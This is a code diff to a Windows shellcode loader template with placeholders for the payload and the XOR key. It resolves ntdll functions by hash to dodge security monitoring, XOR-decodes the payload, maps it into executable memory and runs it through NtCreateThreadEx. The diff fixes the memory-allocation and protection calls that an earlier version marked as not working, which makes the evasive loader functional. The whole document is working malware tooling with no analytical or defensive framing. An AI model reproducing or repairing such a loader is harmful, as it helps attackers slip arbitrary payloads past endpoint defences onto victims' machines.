@@ -5,7 +5,7 @@
 #define TRUE 1
 #define FALSE 0
 
-typedef NTSYSAPI NTSTATUS(NTAPI* NtAlocVirtMem)(
+typedef NTSYSAPI NTSTATUS (NTAPI* NtAllocVirtMem)(
     HANDLE ProcessHandle,
     PVOID* BaseAddress,
     ULONG_PTR ZeroBits,
@@ -199,7 +199,9 @@ void main() {
     // printf("country: %s\n", country);
     
     unsigned char payload[] = "%SHELLCODE%";
-    void* exec;
+
+    SIZE_T regionSize = sizeof(payload);
+    PVOID exec = NULL;
     DWORD old_protect = 0;
     HANDLE th;
     BOOL rv;
@@ -213,7 +215,7 @@ void main() {
 
     HMODULE hNtdll = CustomGetModuleHandle(ndtll_hash);
 
-    NtAlocVirtMem _NtAlocVirtMem = (NtAlocVirtMem)CustomGetProcAdress(hNtdll, virtual_alloc_hash);
+    NtAllocVirtMem _NtAlocVirtMem = (NtAllocVirtMem)CustomGetProcAdress(hNtdll, virtual_alloc_hash);
     NtWriteVirtMem _NtWriteVirtMem = (NtWriteVirtMem)CustomGetProcAdress(hNtdll, write_memory_hash);
     NtProtectVirtMem _NtProtectVirtMem = (NtProtectVirtMem)CustomGetProcAdress(hNtdll, virtual_protect_hash);
     NtCreateThreadEx _NtCreateThreadEx = (NtCreateThreadEx)CustomGetProcAdress(hNtdll, create_thread_hash);
@@ -221,10 +223,8 @@ void main() {
 
     
     // Allocating executable memory
-    exec = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    // NOT WORKING
-    _NtAlocVirtMem((HANDLE)-1, &exec, 0, (PSIZE_T)sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-
+    _NtAlocVirtMem((HANDLE)-1, &exec, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    
     // XORing shellcode
     for (size_t i = 0; i < sizeof(payload); i++) {
         payload[i] ^= %XOR_KEY%;
@@ -234,11 +234,7 @@ void main() {
     _NtWriteVirtMem((HANDLE)-1, exec, payload, sizeof(payload), NULL);
 
     // Changing memory protection to PAGE_EXECUTE_READ
-    // VirtualProtect(exec, sizeof(payload), PAGE_EXECUTE_READ, &old_protect);
-    // VirtualProtect(exec, sizeof(payload), PAGE_READWRITE, &old_protect);
-    // NOT WORKING
-    _NtProtectVirtMem((HANDLE)-1, &exec, (PSIZE_T)sizeof(payload), PAGE_EXECUTE_READ, &old_protect);
-
+    _NtProtectVirtMem((HANDLE)-1, &exec, &regionSize, PAGE_EXECUTE_READ, &old_protect);
 
     // Executing shellcode in a new thread
     _NtCreateThreadEx(&th, GENERIC_ALL, NULL, (HANDLE)-1, exec, NULL, FALSE, (ULONG_PTR)NULL, (SIZE_T)NULL, (SIZE_T)NULL, NULL);
